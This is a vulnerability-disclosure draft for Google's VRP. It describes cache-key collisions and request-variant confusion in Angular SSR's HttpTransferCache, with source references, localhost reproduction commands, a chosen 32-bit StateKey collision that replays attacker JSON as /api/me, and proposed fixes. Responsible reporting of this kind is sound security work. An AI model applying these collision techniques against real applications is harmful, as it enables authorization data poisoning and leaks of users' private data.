# Google VRP Quick Submit - Angular SSR HttpTransferCache trusted response replay

## CAMPO 1: Title (max 200 chars)

```text
Trusted response replay in Angular SSR HttpTransferCache due to incomplete cache key and 32-bit StateKey collisions
```

---

## CAMPO 2: The problem (technical description)

```text
Angular SSR HttpTransferCache caches server-side HttpClient GET/HEAD responses and replays them from
TransferState during SSR/hydration. This behavior is enabled by default through
provideClientHydration().

The vulnerable primitive is in packages/common/http/src/transfer_cache.ts:

- shouldCacheRequest() excludes Authorization and Proxy-Authorization, but not Cookie, other request
  headers, credentials mode, response Vary, or response Cache-Control: private/no-store.
- makeCacheKey() builds the cache key from only:
  [method, responseType, mappedRequestUrl, serializedBody, encodedParams].join('|')
- the complete key is reduced to a 32-bit hash before makeStateKey().
- retrieveStateFromCache() returns a cached response before backend dispatch and does not compare the
  original full request key.

Because of this, Angular can return a response generated for one security context to a different
HttpClient request.

Vulnerable code locations:

- packages/platform-browser/src/hydration.ts:283-285
  provideClientHydration() enables ɵwithHttpTransferCache({}) by default.

- packages/common/http/src/transfer_cache.ts:126-143
  request eligibility does not exclude Cookie/header-varied or private/no-store responses.

- packages/common/http/src/transfer_cache.ts:182-188
  cached response is returned before backend dispatch.

- packages/common/http/src/transfer_cache.ts:322-341
  cache key omits request headers, Cookie, credentials mode, Vary, and Cache-Control semantics.

- packages/common/http/src/transfer_cache.ts:349-361
  full key is reduced to a 32-bit StateKey.

- packages/platform-server/src/transfer_state.ts:70-112
  TransferState is serialized into the HTML ng-state script.

PoC summary:

1. Normal SSR app:
   Two same-URL HttpClient requests differ only by X-Tenant. Backend sends Vary: X-Tenant and
   Cache-Control: private, no-store. Angular returns tenant-a for the tenant-b request, and backend
   is hit only once.

2. Chosen collision:
   GET|json|http://127.0.0.1:4218/feed?x=uibaalzu||
   collides with:
   GET|json|http://127.0.0.1:4218/api/me||
   Both produce StateKey 2884615638. Angular replays attacker-controlled feed JSON as /api/me.
   /api/me is never called, but SSR renders ADMIN_PANEL_SECRET.

3. Deterministic params collision:
   sortAndConcatParams() interpolates params.getAll(k) directly. Since getAll() returns an array,
   role=user&role=admin and role=user,admin both key as role=user,admin before the 32-bit hash.
   Angular replays the repeated-param response into the comma-scalar request.

4. Private state leakage chain:
   Angular serializes a response marked Vary: Cookie and Cache-Control: private, no-store into
   HTML/ng-state. If an outer shared HTML cache stores the page by URL, another user receives the
   first user's private ng-state.
```

---

## CAMPO 3: Impact

```text
1. Request-variant confusion:
   In a normal Angular SSR app using provideClientHydration() and HttpClient, responses that vary by
   X-Tenant, Cookie, Accept-Language, feature flag, or API-version headers can be replayed to a
   different request variant. Backend Vary does not protect the response from Angular's replay.

2. Authorization/bootstrap data poisoning:
   If an attacker can influence one SSR-fetched URL in the same render as a trusted endpoint such as
   /api/me, a chosen 32-bit StateKey collision can cause attacker-controlled JSON to be consumed as
   the trusted endpoint response. The PoC renders ADMIN_PANEL_SECRET even though /api/me is never
   called.

3. Private API data serialized into shareable HTML:
   Angular copies API responses marked Cache-Control: private/no-store into SSR HTML/ng-state. If
   SSR HTML is cached or reused cross-user by a deployment cache, private user data can be delivered
   to another user.

4. Deterministic request-param confusion:
   APIs that distinguish repeated params from comma-delimited scalar params can receive replayed
   responses without the attacker needing to brute-force a 32-bit collision.

Attack Vector:
   Remote attacker influence depends on the app pattern:
   - For request-variant confusion, the app makes multiple same-URL SSR HttpClient requests whose
     backend response varies by headers/cookie.
   - For chosen collision, the attacker controls part of one SSR-fetched URL/query in the same render
     as a sensitive endpoint.
   - For cross-user leakage, the deployment shares SSR HTML across users after Angular has embedded
     private/no-store API data into ng-state.

CWE:
   CWE-524: Use of Cache Containing Sensitive Information
   CWE-525: Use of Web Browser Cache Containing Sensitive Information
   CWE-639: Authorization Bypass Through User-Controlled Key
   CWE-345: Insufficient Verification of Data Authenticity
```

---

## CAMPO 4: Bug type

```text
Server-side cache key confusion / trusted response replay in Angular SSR HttpTransferCache
```

---

## CAMPO 5: Files to upload

```text
1. GOOGLE_VRP_REPORT.md
   Full report with source references, impact demonstrations, limitations, and suggested fixes.

2. server.ts
   Angular SSR PoC for Vary/header confusion, chosen collision into /api/profile, and chosen
   collision into /api/me.

3. shared_cache_private_state_server.ts
   Angular SSR origin plus local shared-cache proxy demonstrating private ng-state cross-user leak
   under the stated deployment condition.

4. find_chosen_transfer_cache_collision.mjs
   Helper that verifies/regenerates the chosen 32-bit StateKey collision.

5. deterministic_params_collision_server.ts
   Angular SSR PoC for the deterministic repeated-param vs comma-scalar collision.

6. 2026-04-29-independent-verification.md
   Independent verification notes confirming source review and runtime reproduction.
```

---

## Reproduction Commands

```bash
# PoC 1 + PoC 2: header variant confusion and /api/me chosen collision
cd /Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter/bugs/angular/a18-transfer-cache-request-variant-confusion/poc/ssr-cookie-app
./node_modules/.bin/tsx server.ts
curl -sS -H 'Cookie: sid=alice' 'http://127.0.0.1:4218/?feed=uibaalzu'
```

Expected relevant output:

```html
<div id="authz">feed={"user":"attacker","role":"admin","source":"feed"}|me={"user":"attacker","role":"admin","source":"feed"}|ADMIN_PANEL_SECRET</div>
<div id="hits">tenant:tenant-a|tenant:tenant-a</div>
```

Expected relevant server log:

```text
[api] /feed hit 1 query= {"x":"uibaalzu"}
[ssr] me body: {"user":"attacker","role":"admin","source":"feed"}
[express] api hit counts profile= 0 me= 0 feed= 1 tenant= 1 collision= 1
```

```bash
# Verify the chosen /api/me collision
cd /Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter
node bugs/angular/a18-transfer-cache-request-variant-confusion/poc/find_chosen_transfer_cache_collision.mjs 'GET|json|http://127.0.0.1:4218/feed?x=' 'GET|json|http://127.0.0.1:4218/api/me||' '||' 'abcdefghijklmnopqrstuvwxyz0123456789' 4 4
```

Expected output:

```json
{
  "suffix": "uibaalzu",
  "attackerKey": "GET|json|http://127.0.0.1:4218/feed?x=uibaalzu||",
  "targetKey": "GET|json|http://127.0.0.1:4218/api/me||",
  "rawHash": 737131990,
  "finalStateKey": "2884615638",
  "verify": true
}
```

```bash
# PoC 2b: deterministic repeated-param vs comma-scalar collision
cd /Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter/bugs/angular/a18-transfer-cache-request-variant-confusion/poc/ssr-cookie-app
./node_modules/.bin/tsx deterministic_params_collision_server.ts
curl -sS 'http://127.0.0.1:4222/'
```

Expected output:

```html
<div id="scope">first=multi:user|admin|second=multi:user|admin</div>
```

Expected server log:

```text
[api] /api/scope hit 1 url= /api/scope?role=user&role=admin body= multi:user|admin
[ssr] first scope body: multi:user|admin
[ssr] second scope body: multi:user|admin
[express] api hit counts scope= 1
```

```bash
# PoC 3: private/no-store API body serialized into shared HTML state
cd /Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter/bugs/angular/a18-transfer-cache-request-variant-confusion/poc/ssr-cookie-app
./node_modules/.bin/tsx shared_cache_private_state_server.ts
curl -sS -i -H 'Cookie: sid=alice' 'http://127.0.0.1:4221/private?case=seq1'
curl -sS -i -H 'Cookie: sid=bob' 'http://127.0.0.1:4221/private?case=seq1'
```

Expected Bob output:

```text
X-Proxy-Cache: HIT
```

```html
<div id="private">private:sid=alice</div>
<script id="ng-state" type="application/json">{"3517752801":{"b":"private:sid=alice","h":{},"s":200,"st":"OK","u":"http://127.0.0.1:4220/api/private","rt":"text"},"__nghData__":[{}]}</script>
```

---

## Fix

```text
Possible Angular-side fixes:

1. Do not cache responses with Vary unless Angular can honor every listed request-header dimension.
2. Include Vary-listed request headers in the transfer-cache key.
3. Do not cache responses with Cache-Control: no-store or private unless the app explicitly opts in.
4. Treat Cookie and credential-bearing requests as auth-sensitive by default, similar to
   Authorization.
5. Replace the 32-bit StateKey with a collision-resistant key, or store and compare the original
   full request key before replay.
6. Document that includeHeaders only transfers headers and does not make Angular honor Vary or
   Cache-Control semantics.
```
